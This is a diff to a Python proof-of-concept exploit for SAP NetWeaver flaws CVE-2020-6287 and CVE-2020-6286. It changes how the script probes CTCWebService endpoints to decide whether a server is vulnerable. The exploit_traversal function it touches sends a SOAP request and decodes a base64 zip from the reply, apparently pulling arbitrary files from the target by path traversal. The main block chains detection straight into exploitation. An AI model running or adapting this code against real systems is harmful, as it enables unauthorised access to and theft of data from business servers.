@@ -19,24 +19,28 @@ Solution: https://launchpad.support.sap.com/#/notes/2934135, https://launchpad.s
 def detect_vuln(base_url):
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC"}
-    status = 'OK'
-    checks =  [{"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":405},
-               {"name":"Check2","path":"/CTCWebService/CTCWebServiceBean?wsdl","sign_status":200},
-               {"name":"Check3","path":"/CTCWebService/Config1?wsdl","sign_status":200}]
+    checks =  [{"name":"Check1","path":"/CTCWebService/CTCWebServiceBean","sign_status":405}
+               ,{"name":"Check2","path":"/CTCWebService/CTCWebServiceBean?wsdl","sign_status":200}
+               #,{"name":"Check3","path":"/CTCWebService/Config1?wsdl","sign_status":200}
+               ]
     for check in checks:
         ans = requests.get(base_url + check['path'], headers=headers, timeout=timeout, allow_redirects=False, verify=False)
         if ans.status_code == check['sign_status']:
-            status = 'Vulnerable!'
-            print ("%s - %s - %s" %(check['name'], status, base_url + check['path'] ))
-            return {"status":True, "url":base_url + check['path']}
+            print ("%s - %s - %s" %(check['name'], 'PASSED!', base_url + check['path'] ))
         else:
-            print ("%s - %s" %(check['name'], status))
-            return {"status":False, "url":""}
+            print ("%s - %s " %(check['name'], 'NOT PASSED!'))
+            print('Not Vulnerable!')
+            return {"status":False, "url":base_url + check['path']}
+    print ('Vulnerable!')
+    return {"status":True, "url":base_url + check['path']}
+
+
+
 
 
 def exploit_traversal(url, zipfile):
     headers = {
-        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6287 PoC",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 CVE-2020-6286 PoC",
         "Content-Type":"text/xml;charset=UTF-8"}
     xml = '''
     <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:CTCWebServiceSi">
@@ -49,6 +53,7 @@ def exploit_traversal(url, zipfile):
 </soapenv:Envelope>
     ''' % (zipfile.replace(".zip",""))
     ans = requests.post(url, headers=headers, timeout=timeout, data=xml, verify=False)
+
     if ans.status_code == 200:
         myroot = ET.fromstring(ans.content)
         zipb64 = ''
@@ -90,5 +95,3 @@ if __name__ == '__main__':
         result = detect_vuln(base_url)
         if result["status"]:
             exploit_traversal(result["url"].replace("?wsdl",""),args.zipfile)
-
-
